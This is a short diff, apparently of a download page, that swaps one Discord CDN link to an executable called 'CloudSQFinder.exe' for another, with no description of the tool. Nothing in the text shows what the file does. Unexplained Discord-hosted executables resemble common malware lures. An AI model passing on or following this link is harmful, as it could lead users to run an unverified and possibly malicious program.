@@ -1,2 +1,2 @@
 Download:
-[HERE](https://cdn.discordapp.com/attachments/941626309992407049/1292664069450367058/CloudSQFinder.exe?ex=67048eba&is=67033d3a&hm=2156bb5f9e48ecfc5ab5b946b0150aa70b0daf2349e38af600aa937e975f5743&)
+[HERE](https://cdn.discordapp.com/attachments/653799011676979200/1294399542644572222/CloudSQFinder.exe?ex=670adf03&is=67098d83&hm=34f14b863d7e5eb514d9795e1ecf03c2013209368c510eb7afc1814053704245&)
